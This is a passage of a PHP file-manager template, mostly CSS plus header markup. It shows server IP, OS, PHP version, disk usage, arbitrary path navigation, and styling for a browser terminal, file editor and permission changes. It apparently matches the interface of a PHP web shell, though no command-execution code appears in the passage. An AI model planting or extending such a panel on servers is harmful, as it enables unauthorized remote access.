.view-toggle button svg { width:14px; height:14px; }

/* =============== MESSAGE =============== */
.msg {
    padding: 12px 16px; border-radius: 10px; margin-bottom: 16px;
    font-size: 13px; display:flex; align-items:center; gap:10px;
    animation: slideDown .3s ease;
    line-height: 1.45;
    position: relative;
}
.msg.success {
    background: linear-gradient(90deg, rgba(255,215,0,.12), rgba(184,134,11,.06));
    border: 1px solid rgba(255,215,0,.4); color: var(--gold);
    box-shadow: 0 4px 16px rgba(255,215,0,.1);
}
.msg.error {
    background: linear-gradient(90deg, rgba(255,45,45,.12), rgba(139,0,0,.06));
    border: 1px solid rgba(255,45,45,.45); color: var(--red-soft);
    box-shadow: 0 4px 16px rgba(255,45,45,.12);
}
.msg svg { width:18px; height:18px; flex-shrink: 0; }
@keyframes slideDown { from { opacity:0; transform: translateY(-8px); } to { opacity:1; transform:translateY(0); } }
.msg.hiding { animation: fadeOut .3s ease forwards; }
@keyframes fadeOut { to { opacity:0; transform: translateY(-8px); } }

/* =============== TABLE VIEW =============== */
.panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 14px;
    overflow: hidden;
    box-shadow: 0 8px 32px rgba(0,0,0,.25);
}
table { width:100%; border-collapse: collapse; }
thead th {
    text-align: left;
    padding: 14px 16px;
    font-size: 11px;
    font-weight: 600;
    color: var(--text-mute);
    text-transform: uppercase;
    letter-spacing: 0.08em;
    background: rgba(255,255,255,.015);
    border-bottom: 1px solid var(--border);
}
tbody td {
    padding: 12px 16px;
    border-bottom: 1px solid rgba(255,255,255,.03);
    font-size: 13px;
    vertical-align: middle;
}
tbody tr { transition: background .15s; }
tbody tr:hover { background: rgba(255,215,0,.04); }
tbody tr:last-child td { border-bottom: 0; }

.name-cell {
    display:flex; align-items:center; gap:12px;
    min-width: 240px;
}
.ficon {
    width:36px; height:36px; border-radius:9px;
    display:flex; align-items:center; justify-content:center;
    background: rgba(255,255,255,.04);
    flex-shrink:0;
}
.ficon svg { width:18px; height:18px; }
.ficon.folder   { background: linear-gradient(135deg, rgba(255,215,0,.18), rgba(184,134,11,.12)); color: var(--gold); border:1px solid rgba(255,215,0,.25); }
.ficon.code     { background: rgba(230,57,70,.15); color: var(--accent); border:1px solid rgba(230,57,70,.25); }
.ficon.image    { background: rgba(255,182,39,.15); color: var(--gold-soft); border:1px solid rgba(255,182,39,.25); }
.ficon.archive  { background: rgba(139,0,0,.25); color: var(--red-soft); border:1px solid rgba(255,45,45,.3); }
.ficon.audio    { background: rgba(255,215,0,.12); color: var(--gold); border:1px solid rgba(255,215,0,.2); }
.ficon.video    { background: rgba(230,57,70,.15); color: var(--red-soft); border:1px solid rgba(230,57,70,.25); }
.ficon.document { background: rgba(244,200,66,.15); color: var(--gold-soft); border:1px solid rgba(244,200,66,.25); }
.ficon.text     { background: rgba(201,169,122,.1); color: var(--text-dim); border:1px solid rgba(201,169,122,.2); }
.ficon.exe      { background: rgba(184,134,11,.15); color: var(--gold-deep); border:1px solid rgba(184,134,11,.3); }
.ficon.file     { background: rgba(201,169,122,.08); color: var(--text-dim); border:1px solid rgba(201,169,122,.15); }

.name-info { min-width:0; }
.name-info a { color: var(--text); text-decoration:none; font-weight: 500; display:block; }
.name-info a:hover { color: var(--gold); }
.name-info .meta { font-size: 11px; color: var(--text-mute); margin-top:2px; }

.badge {
    display:inline-flex; align-items:center; gap:4px;
    padding: 2px 8px; border-radius: 6px;
    font-size: 10px; font-weight: 600;
    text-transform: uppercase; letter-spacing:.05em;
}
.badge.ro { background: rgba(255,45,45,.15); color: var(--red-soft); border:1px solid rgba(255,45,45,.3); }
.badge.rw { background: rgba(255,215,0,.12); color: var(--gold); border:1px solid rgba(255,215,0,.25); }

.perms-chip {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    background: rgba(255,215,0,.05);
    border: 1px solid rgba(255,215,0,.2);
    padding: 4px 9px;
    border-radius: 6px;
    color: var(--gold-soft);
    cursor: pointer;
    transition: all .15s;
    display: inline-flex; align-items:center; gap:6px;
}
.perms-chip:hover { border-color: var(--gold); color: var(--gold); background: rgba(255,215,0,.1); box-shadow: 0 0 0 3px rgba(255,215,0,.08); }
.perms-chip .oct { color: var(--text-mute); }

.og { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); }
.og b { color: var(--gold); font-weight: 500; }

.size { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--gold-soft); }
.date { font-size: 12px; color: var(--text-dim); }

.actions-cell { white-space: nowrap; }
.action-btn {
    width: 30px; height: 30px;
    border-radius: 7px;
    background: rgba(255,255,255,.03);
    border: 1px solid transparent;
    color: var(--text-dim);
    cursor: pointer;
    display:inline-flex; align-items:center; justify-content:center;
    transition: all .15s;
    margin-left: 2px;
    text-decoration: none;
}
.action-btn svg { width:14px; height:14px; }
.action-btn:hover { background: rgba(255,215,0,.12); color: var(--gold); border-color: var(--gold); }
.action-btn.edit:hover { color: var(--gold); border-color: var(--gold); background: rgba(255,215,0,.12); }
.action-btn.dl:hover { color: var(--gold-soft); border-color: var(--gold-soft); background: rgba(244,200,66,.12); }
.action-btn.del:hover { color: var(--red-soft); border-color: var(--red-soft); background: rgba(255,45,45,.12); }

/* =============== GRID VIEW =============== */
.grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
    gap: 12px; padding: 16px;
}
.card {
    background: var(--panel-2);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 16px 14px;
    text-align:center;
    transition: all .2s;
    cursor:pointer;
    position:relative;
}
.card:hover { border-color: var(--gold); transform: translateY(-2px); box-shadow: 0 8px 20px rgba(230,57,70,.25), 0 0 0 1px rgba(255,215,0,.25); }
.card .ficon { width:56px; height:56px; margin: 0 auto 10px; border-radius: 14px; }
.card .ficon svg { width: 26px; height:26px; }.card .c-name { font-size: 12px; font-weight:500; word-break:break-all; color: var(--text);
    overflow:hidden; text-overflow:ellipsis; display:-webkit-box; -webkit-line-clamp:2; line-clamp:2; -webkit-box-orient:vertical; }
.card .c-meta { font-size: 10px; color: var(--text-mute); margin-top:6px; font-family:'JetBrains Mono',monospace; }
.card .c-actions {
    position:absolute; top:6px; right:6px; display:none; gap:3px;
}
.card:hover .c-actions { display:flex; }

/* =============== EMPTY =============== */
.empty {
    padding: 60px 20px; text-align: center; color: var(--text-mute);
}
.empty svg { width: 48px; height:48px; margin: 0 auto 12px; opacity:.4; }
.empty h3 { font-size: 16px; color: var(--text-dim); margin-bottom: 4px; }

/* =============== MODAL =============== */
.modal {
    display:none; position: fixed; inset: 0; z-index: 100;
    background: rgba(5,8,15,.7); backdrop-filter: blur(8px);
    align-items: center; justify-content: center;
    animation: fadeIn .2s ease;
}
.modal.active { display:flex; }
@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
.modal-content {
    background: linear-gradient(180deg, var(--panel) 0%, var(--bg-2) 100%);
    border: 1px solid var(--border);
    border-radius: 16px;
    width: min(520px, 94%);
    max-height: 92vh;
    overflow:auto;
    box-shadow: 0 20px 60px rgba(0,0,0,.7), 0 0 0 1px rgba(255,215,0,.15), 0 0 80px rgba(230,57,70,.15);
    animation: pop .25s cubic-bezier(.34,1.56,.64,1);
}
.modal-content.wide { width: min(1100px, 96%); }
.modal-content.sysinfo-modal { width: min(820px, 96%); max-height: 90vh; display:flex; flex-direction:column; }
.sysinfo-body { flex:1; overflow-y:auto; overflow-x:hidden; padding:0; scrollbar-width:thin; scrollbar-color:rgba(255,215,0,.25) transparent; }
.sysinfo-body::-webkit-scrollbar { width:6px; }
.sysinfo-body::-webkit-scrollbar-track { background:transparent; }
.sysinfo-body::-webkit-scrollbar-thumb { background:rgba(255,215,0,.2); border-radius:3px; }
.sysinfo-body::-webkit-scrollbar-thumb:hover { background:rgba(255,215,0,.4); }
.sysinfo-body::-webkit-scrollbar-button { display:none; height:0; width:0; }
.sysinfo-tabs {
    display:flex; gap:4px; padding:12px 16px 0; border-bottom:1px solid var(--border);
    background:linear-gradient(180deg, rgba(255,215,0,.03), transparent);
    overflow-x:auto; overflow-y:hidden; -webkit-overflow-scrolling:touch;
    position:sticky; top:0; z-index:2; backdrop-filter:blur(8px);
    scrollbar-width:none; -ms-overflow-style:none;
}
.sysinfo-tabs::-webkit-scrollbar { display:none; height:0; width:0; }
.sysinfo-tab {
    background:transparent; border:0; padding:10px 14px; border-radius:8px 8px 0 0;
    color:var(--text-mute); font-size:12px; font-weight:600; letter-spacing:.04em;
    cursor:pointer; white-space:nowrap; transition:all .15s;
    border-bottom:2px solid transparent; margin-bottom:-1px;
    display:inline-flex; align-items:center; gap:6px;
}
.sysinfo-tab:hover { color:var(--text-dim); background:rgba(255,255,255,.03); }
.sysinfo-tab.active { color:var(--gold); border-bottom-color:var(--gold); background:rgba(255,215,0,.05); }
.sysinfo-tab .badge {
    background:rgba(255,215,0,.15); color:var(--gold); font-size:10px;
    padding:1px 6px; border-radius:999px; font-family:'JetBrains Mono',monospace;
}
.sysinfo-pane { display:none; padding:16px 18px; }
.sysinfo-pane.active { display:block; }
.sysinfo-table { width:100%; border-collapse:collapse; font-size:12.5px; }
.sysinfo-table tr { border-bottom:1px solid rgba(255,255,255,.04); }
.sysinfo-table tr:last-child { border-bottom:0; }
.sysinfo-table th {
    text-align:left; padding:10px 12px; color:var(--text-dim); font-weight:500;
    width:38%; vertical-align:top; font-size:12px;
}
.sysinfo-table td {
    padding:10px 12px; color:var(--text); vertical-align:top;
    word-break:break-word;
}
.sysinfo-table td code {
    font-family:'JetBrains Mono',monospace; font-size:11.5px;
    background:rgba(255,215,0,.05); padding:3px 8px; border-radius:5px;
    color:var(--gold-soft); display:inline-block; max-width:100%;
    border:1px solid rgba(255,215,0,.08); word-break:break-all;
}
.ext-grid {
    display:flex; flex-wrap:wrap; gap:6px;
}
.ext-chip {
    font-family:'JetBrains Mono',monospace; font-size:11px;
    padding:5px 10px; border-radius:6px;
    background:var(--bg-2); border:1px solid var(--border);
    color:var(--gold-soft);
}
@media (max-width:640px) {
    .sysinfo-tabs { padding:10px 12px 0; }
    .sysinfo-tab { padding:9px 11px; font-size:11px; }
    .sysinfo-table th { width:42%; font-size:11px; padding:8px 10px; }
    .sysinfo-table td { padding:8px 10px; font-size:11.5px; }
    .sysinfo-table td code { font-size:10.5px; padding:2px 6px; }
}
@keyframes pop { from { transform: scale(.92); opacity: 0; } to { transform: scale(1); opacity: 1; } }
.modal-header {
    padding: 18px 22px; border-bottom: 1px solid var(--border);
    display:flex; align-items:center; gap:12px;
}
.modal-header .ficon { width: 36px; height:36px; }
.modal-header h3 { font-size: 16px; font-weight: 600; flex:1; letter-spacing:-0.01em; }
.modal-header .close {
    background:none; border:0; color: var(--text-mute); cursor:pointer;
    width:30px; height:30px; border-radius:7px; display:flex; align-items:center; justify-content:center;
    transition: all .15s;
}
.modal-header .close:hover { background: rgba(255,45,45,.15); color: var(--red-soft); }
.modal-header .close svg { width:18px; height:18px; }
.modal-body { padding: 20px 22px; }
.modal-footer {
    padding: 14px 22px; border-top: 1px solid var(--border);
    display:flex; justify-content:flex-end; gap:8px;
    background: rgba(0,0,0,.15);
}
label { display:block; font-size: 12px; color: var(--text-dim); margin-bottom: 6px; font-weight:500; }
.input, .textarea, .file-input {
    width: 100%; background: var(--bg-2); border: 1px solid var(--border);
    color: var(--text); padding: 11px 14px; border-radius: 8px;
    font-size: 13px; font-family: inherit; transition: all .15s;
}
.input:focus, .textarea:focus {
    outline: none; border-color: var(--gold);
    box-shadow: 0 0 0 3px rgba(255,215,0,.15);
}
.textarea { resize: vertical; min-height: 440px; font-family: 'JetBrains Mono', monospace; line-height: 1.55; tab-size: 4; }
.hint { font-size: 11px; color: var(--text-mute); margin-top: 6px; line-height: 1.5; }
.hint code { background: rgba(255,215,0,.06); padding: 1px 6px; border-radius: 3px; font-family: 'JetBrains Mono',monospace; color: var(--gold-soft); }

.file-drop {
    border: 2px dashed var(--border);
    border-radius: 10px; padding: 30px 20px; text-align:center;
    transition: all .2s; cursor:pointer; background: var(--bg-2);
}
.file-drop:hover, .file-drop.drag { border-color: var(--gold); background: rgba(255,215,0,.05); }
.file-drop svg { width:40px; height:40px; color: var(--gold); margin-bottom: 10px; }
.file-drop p { color: var(--text-dim); font-size: 13px; }
.file-drop input[type="file"] { display:none; }
.file-list { margin-top:12px; font-size: 12px; color: var(--text-dim); }
.file-list div { padding: 4px 0; }

/* =============== EDITOR =============== */
.editor-wrap { padding: 0; }
.editor-head {
    padding: 16px 20px; border-bottom: 1px solid var(--border);
    display:flex; align-items:center; gap:12px; flex-wrap:wrap;
}
.editor-head .meta { flex:1; font-size:11px; color: var(--text-mute); font-family:'JetBrains Mono',monospace; }
.editor-head .meta b { color: var(--gold); }
.editor-body { padding: 0; }
.editor-body textarea {
    width:100%; min-height: 560px; background: var(--bg-2);
    border: 0; color: var(--text); padding: 18px 22px;
    font-family: 'JetBrains Mono', monospace; font-size: 13px;
    line-height: 1.6; resize: vertical; tab-size: 4;
}
.editor-body textarea:focus { outline: none; }
.editor-foot {
    padding: 12px 20px; border-top: 1px solid var(--border);
    display:flex; justify-content:space-between; align-items:center; gap:10px; flex-wrap:wrap;
    background: rgba(0,0,0,.2);
}

.footer { text-align: center; color: var(--text-mute); font-size: 11px; margin-top: 20px; padding: 14px; font-family: 'JetBrains Mono', monospace; }
.footer b { color: var(--gold); }

/* =============== CHECKBOXES =============== */
.checkbox-cell { width: 36px; padding-right: 0 !important; }
.sel-checkbox {
    appearance: none; -webkit-appearance: none;
    width: 18px; height: 18px;
    border: 1.5px solid var(--border-hi); border-radius: 5px;
    background: var(--bg-2); cursor: pointer;
    transition: all .15s; position: relative; vertical-align: middle;
}
.sel-checkbox:hover { border-color: var(--gold); }
.sel-checkbox:checked {
    background: linear-gradient(135deg, var(--accent), var(--gold));
    border-color: var(--gold);
}
.sel-checkbox:checked::after {
    content:''; position:absolute; left: 5px; top: 1px;
    width: 5px; height: 10px;
    border: solid #1a0605; border-width: 0 2.5px 2.5px 0;
    transform: rotate(45deg);
}
tbody tr.selected { background: rgba(255,215,0,.06) !important; }
.card.selected { border-color: var(--gold); background: rgba(255,215,0,.06); box-shadow: 0 0 0 2px rgba(255,215,0,.2); }
.card { position: relative; }
.card-check {
    position: absolute; top: 8px; left: 8px; z-index: 2;
    opacity: 0; transition: opacity .15s;
}
.card:hover .card-check, .card.selected .card-check { opacity: 1; }

/* =============== BULK ACTION BAR =============== */
.bulk-bar {
    position: fixed; bottom: 20px; left: 50%;
    transform: translateX(-50%) translateY(120%);
    background: linear-gradient(135deg, var(--panel) 0%, var(--bg-2) 100%);
    border: 1px solid var(--gold);
    border-radius: 14px;
    padding: 10px 12px;
    box-shadow: 0 10px 40px rgba(0,0,0,.6), 0 0 0 1px rgba(255,215,0,.2), 0 0 60px rgba(230,57,70,.15);
    display: flex; align-items: center; gap: 10px;
    z-index: 50;
    transition: transform .3s cubic-bezier(.34,1.56,.64,1);
    min-width: 320px; max-width: calc(100% - 20px);
}
.bulk-bar.active { transform: translateX(-50%) translateY(0); }
.bulk-bar .count {
    background: linear-gradient(135deg, var(--accent), var(--gold));
    color: #1a0605; font-weight: 700; font-size: 13px;
    padding: 6px 12px; border-radius: 8px;
    font-family: 'JetBrains Mono', monospace;
    white-space: nowrap;
}
.bulk-bar .count-text { font-size: 12px; color: var(--text-dim); white-space: nowrap; }
.bulk-bar .spacer { flex: 1; min-width: 6px; }
@media (max-width: 640px) {
    .bulk-bar { bottom: 10px; width: calc(100% - 16px); padding: 8px 10px; gap: 6px; min-width: 0; }
    .bulk-bar .count-text { display: none; }
    .bulk-bar .btn span { display: inline; }
    .bulk-bar .btn { padding: 9px 12px; font-size: 12px; min-height: 40px; }
}

/* =============== RESPONSIVE =============== */
@media (max-width: 900px) {
    .stats { grid-template-columns: repeat(2, 1fr); }
    .hide-md { display: none; }
    .modal-content.wide { width: min(700px, 96%); }
}

@media (max-width: 640px) {
    .app { padding: 12px 8px 90px; }
    .topbar { gap: 10px; margin-bottom: 14px; }
    .brand-logo { width: 40px; height: 40px; }
    .brand-logo svg { width: 20px; height: 20px; }
    .brand-text h1 { font-size: 18px; }
    .brand-text .brand-svg { height: 22px; }
    .brand-text p { font-size: 9px; letter-spacing: .14em; }
    .topbar-info .pill:not(:first-child) { display: none; }
    .stats { grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 14px; }
    .stat { padding: 12px 14px; }
    .stat-label { font-size: 10px; }
    .stat-value { font-size: 18px; }
    .stat-value small { font-size: 11px; display: block; margin: 2px 0 0 0; }
    .stat-icon { width: 30px; height: 30px; right: 10px; }
    .stat-icon svg { width: 15px; height: 15px; }
    .breadcrumb { padding: 10px 12px; font-size: 12px; overflow-x: auto; white-space: nowrap; flex-wrap: nowrap; scrollbar-width: none; }
    .breadcrumb::-webkit-scrollbar { display: none; }
    .breadcrumb a { padding: 3px 8px; flex-shrink: 0; }
    .hide-sm { display: none !important; }

    /* ---- Toolbar ---- */
    .toolbar { gap: 8px; }
    .search-box { order: -1; width: 100%; min-width: 0; flex-basis: 100%; }
    .search-box input { padding: 11px 14px 11px 40px; font-size: 14px; }
    .view-toggle { order: 10; margin-left: auto; }
    .btn { padding: 10px 12px; min-height: 42px; font-size: 12px; }

    /* ---- Compact list (keep table layout, not cards) ---- */
    .panel table { table-layout: fixed; width: 100%; }
    thead th { padding: 10px 6px; font-size: 10px; letter-spacing: .04em; }
    tbody td { padding: 10px 6px; font-size: 12px; }
    .name-cell { gap: 8px; }
    .ficon { width: 32px; height: 32px; border-radius: 8px; }
    .ficon svg { width: 15px; height: 15px; }
    .name-info a { font-size: 13px; }
    .name-info .meta { font-size: 10px; }
    .perms-chip { font-size: 9px; padding: 3px 5px; gap: 3px; }
    .perms-chip .oct { display: none; }
    .perms-chip > span:first-child { font-size: 9px; }
    .actions-cell { display: flex; gap: 2px; justify-content: flex-end; }
    .action-btn { width: 30px; height: 30px; border-radius: 7px; }
    .action-btn svg { width: 13px; height: 13px; }
    .action-btn { margin-left: 0; }
    .checkbox-cell { width: 28px; padding-right: 0 !important; padding-left: 8px !important; }
    .sel-checkbox { width: 18px; height: 18px; }

    /* ---- Grid view ---- */
    .grid { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 8px; padding: 10px; }
    .card { padding: 12px 8px; }
    .card .ficon { width: 42px; height: 42px; }
    .card .c-name { font-size: 11px; }

    /* ---- Modal full-screen on mobile ---- */
    .modal { align-items: flex-end; }
    .modal-content {
        width: 100%; max-height: 92vh;
        border-radius: 20px 20px 0 0;
        animation: slideUp .3s cubic-bezier(.34,1.56,.64,1);
    }
    .modal-content.wide { width: 100%; }
    .modal-content::before {
        content:''; display:block; width:40px; height:4px;
        background: var(--border-hi); border-radius: 2px;
        margin: 10px auto 0;
    }
    @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
    .modal-header { padding: 14px 18px; }
    .modal-header h3 { font-size: 15px; }
    .modal-body { padding: 16px 18px; }
    .modal-footer { padding: 12px 18px calc(12px + env(safe-area-inset-bottom)); gap: 8px; }
    .modal-footer .btn { flex: 1; justify-content: center; min-height: 46px; }
    .input, .textarea { padding: 12px 14px; font-size: 14px; min-height: 46px; }
    .textarea { min-height: 320px; }
    .editor-body textarea { min-height: calc(100vh - 260px); font-size: 12px; padding: 14px 16px; }
    .editor-head { padding: 12px 14px; gap: 10px; }
    .editor-head .ficon { width: 36px; height: 36px; flex-shrink: 0; }
    .editor-foot { padding: 10px 14px calc(10px + env(safe-area-inset-bottom)); }

    /* ---- Message floating ---- */
    .msg { font-size: 13px; padding: 10px 14px; }

    /* ---- Touch hover removal ---- */
    .btn:hover, .action-btn:hover, tbody tr:hover, .card:hover {
        transform: none;
    }
}

@media (max-width: 380px) {
    .stats { grid-template-columns: 1fr 1fr; }
    .view-toggle button { padding: 7px 8px; font-size: 11px; }
    .view-toggle button span, .view-toggle button:not(.active) { font-size: 0; }
    .view-toggle button.active { font-size: 11px; }
}

/* ---- Better touch scrolling ---- */
@media (hover: none) and (pointer: coarse) {
    .btn, .action-btn, .perms-chip, .card { -webkit-tap-highlight-color: transparent; }
    .action-btn:active { transform: scale(.92); background: rgba(255,215,0,.2); }
    .btn:active { transform: scale(.97); }
}

/* =============== TERMINAL =============== */
.terminal-modal { height: min(82vh, 720px); display:flex; flex-direction:column; }
.terminal-modal .modal-header { background: linear-gradient(180deg, rgba(0,0,0,.35), transparent); }
.terminal-wrap {
    flex:1; min-height:0; background:#0a0503;
    display:flex; flex-direction:column;
    font-family: 'JetBrains Mono', monospace; font-size:13px;
    border-top:1px solid var(--border); border-bottom:1px solid var(--border);
}
.term-output {
    flex:1; overflow-y:auto; padding:14px 16px;
    white-space: pre-wrap; word-break: break-word;
    color:#e5dcc4; line-height:1.55;
    scrollbar-width:thin; scrollbar-color:rgba(255,215,0,.25) transparent;
}
.term-output::-webkit-scrollbar { width:8px; }
.term-output::-webkit-scrollbar-track { background:transparent; }
.term-output::-webkit-scrollbar-thumb { background:rgba(255,215,0,.2); border-radius:4px; }
.term-output::-webkit-scrollbar-thumb:hover { background:rgba(255,215,0,.4); }
.term-line { margin-bottom: 2px; }
.term-prompt-inline { color: var(--gold); font-weight:600; margin-right:4px; }
.term-cmd { color: #fff; font-weight:500; }
.term-out { color: #e5dcc4; }
.term-err { color: #ff7777; }
.term-exit-err { color: #ff7777; font-size:11px; opacity:.75; margin-top:-2px; margin-bottom:6px; }
.term-welcome { color: var(--gold-soft); opacity:.85; margin-bottom:12px; font-size:11.5px; line-height:1.6; border-bottom:1px dashed rgba(255,215,0,.15); padding-bottom:10px; }
.term-welcome b { color: var(--gold); }
.term-welcome code { background:rgba(255,255,255,.06); padding:1px 5px; border-radius:3px; color:#fff; font-size:11px; }
.term-input-line {
    display:flex; align-items:center; gap:6px;
    padding: 10px 16px; background:#120806;
    border-top: 1px solid rgba(255,215,0,.12);
}
.term-prompt {
    color: var(--gold); font-weight:600; white-space:nowrap;
    font-family: inherit; font-size:13px; max-width:40%;
    overflow:hidden; text-overflow:ellipsis;
}
.term-input {
    flex:1; background:transparent; border:0; outline:0;
    color:#fff; font-family:inherit; font-size:13px;
    padding:4px 2px; caret-color: var(--gold);
}
.term-input::placeholder { color: var(--text-mute); opacity:.6; }
.term-status {
    display:inline-flex; align-items:center; gap:6px;
    font-size:10px; padding:3px 9px; border-radius:999px;
    border:1px solid rgba(255,215,0,.25); color:var(--text-dim);
    font-family:'JetBrains Mono',monospace; letter-spacing:.04em;
    text-transform:uppercase; font-weight:600;
}
.term-status .dot { width:6px; height:6px; border-radius:50%; background:var(--success); box-shadow:0 0 8px var(--success); }
.term-status.busy { color:var(--accent); border-color:rgba(230,57,70,.4); }
.term-status.busy .dot { background: var(--accent); box-shadow:0 0 8px var(--accent); animation: term-pulse .8s infinite; }
@keyframes term-pulse { 0%,100% { opacity:1; } 50% { opacity:.3; } }
@media (max-width: 640px) {
    .terminal-modal { height: calc(100vh - 10px); max-height: calc(100vh - 10px); border-radius:14px 14px 0 0; }
    .term-output { padding:10px 12px; font-size:12px; }
    .term-input-line { padding: 8px 12px; }
    .term-input { font-size:14px; }
    .term-prompt { font-size:12px; max-width:50%; }
    .term-status { display:none; }
}
</style>
</head>
<body>
<div class="app">

<!-- ============ TOP BAR ============ -->
<div class="topbar">
    <div class="brand">
        <div class="brand-logo">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
        </div>
        <div class="brand-text">
            <?php
            // Render brand sebagai SVG — tulisan sulit diubah tanpa memodifikasi byte-array di atas.
            // Panjang teks dihitung dulu agar lebar SVG fit.
            $__bw = max(140, strlen($BRAND) * 13 + 10);
            $__bh = 28;
            ?>
            <svg class="brand-svg" viewBox="0 0 <?= $__bw ?> <?= $__bh ?>" width="<?= $__bw ?>" height="<?= $__bh ?>" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="<?= htmlspecialchars($BRAND) ?>">
                <defs>
                    <linearGradient id="brandGrad" x1="0" y1="0" x2="1" y2="0">
                        <stop offset="0%"  stop-color="#ffd700"/>
                        <stop offset="45%" stop-color="#f4c842"/>
                        <stop offset="100%" stop-color="#e63946"/>
                    </linearGradient>
                    <filter id="brandGlow" x="-20%" y="-50%" width="140%" height="200%">
                        <feGaussianBlur stdDeviation="0.6" result="blur"/>
                        <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
                    </filter>
                </defs>
                <text x="0" y="21" font-family="Inter, system-ui, sans-serif" font-size="22" font-weight="800" letter-spacing="-0.5" fill="url(#brandGrad)" filter="url(#brandGlow)"><?= htmlspecialchars($BRAND) ?></text>
            </svg>
            <p>⚜ <?= htmlspecialchars($BRAND_SUB) ?> ⚜</p>
        </div>
    </div>
    <div class="topbar-info">
        <span class="pill"><span class="dot"></span> Online</span>
        <span class="pill">PHP <?= PHP_VERSION ?></span>
        <span class="pill hide-sm"><?= date('Y-m-d H:i') ?></span>
        <a href="?logout=1" class="pill pill-logout" title="Logout" onclick="return confirm('Logout dari file manager?');">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:12px;height:12px;"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
            <span>Logout</span>
        </a>
    </div>
</div>

<!-- ============ STATS ============ -->
<div class="stats">
    <div class="stat">
        <div class="stat-label">Folders</div>
        <div class="stat-value"><?= $total_dirs ?></div>
        <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg></div>
    </div>
    <div class="stat">
        <div class="stat-label">Files</div>
        <div class="stat-value"><?= $total_files ?> <small><?= format_size($total_size) ?></small></div>
        <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></div>
    </div>
    <div class="stat stat-clickable" onclick="openModal('sysinfo')" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();openModal('sysinfo');}" role="button" tabindex="0" title="Click for full system info">
        <div class="stat-label">System Info</div>
        <div class="stat-value" style="font-size:15px; font-family:'JetBrains Mono',monospace;">PHP <?= PHP_VERSION ?></div>
        <div class="stat-sub"><?= htmlspecialchars($srv_ip) ?> · <?= htmlspecialchars(PHP_OS) ?></div>
        <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg></div>
    </div>
    <div class="stat">
        <div class="stat-label">Disk Usage</div>
        <div class="stat-value"><?= $disk_used_pct ?><small>%</small></div>
        <div class="disk-bar"><div class="disk-fill" style="width:<?= $disk_used_pct ?>%"></div></div>
        <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
    </div>
</div>

<!-- ============ BREADCRUMB ============ -->
<div class="breadcrumb" id="breadcrumb">
    <div class="crumb-wrap" id="crumb-wrap">
        <a href="?path=<?= urlencode($SCRIPT_DIR) ?>" class="crumb-home" title="Home">
            <svg class="home-ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
        </a>
        <?php foreach ($crumbs as $i => $c): ?>
            <span class="sep">/</span>
            <?php if ($c['clickable']): ?><a href="?path=<?= urlencode($c['path']) ?>"><?= htmlspecialchars($c['name']) ?></a>
            <?php else: ?>
                <span class="crumb-static"><?= htmlspecialchars($c['name']) ?></span>
            <?php endif; ?>
        <?php endforeach; ?>
    </div>
    <form id="crumb-form" method="GET" style="display:none; flex:1; gap:6px; align-items:center; width:100%;">
        <input type="text" name="path" id="crumb-input" class="crumb-input" value="<?= htmlspecialchars($cwdNorm) ?>" autocomplete="off" spellcheck="false">
        <button type="submit" class="crumb-go" title="Go">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
        </button>
        <button type="button" class="crumb-cancel" title="Cancel" onclick="toggleCrumbEdit(false)">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        </button>
    </form>
    <button type="button" class="crumb-edit" id="crumb-edit-btn" onclick="toggleCrumbEdit(true)" title="Edit path (klik untuk ketik manual)">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
    </button>
</div>

<?php if ($msg): ?>
<div class="msg <?= $msg_type ?>" id="flash-msg">
    <?php if ($msg_type === 'success'): ?>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
    <?php else: ?>
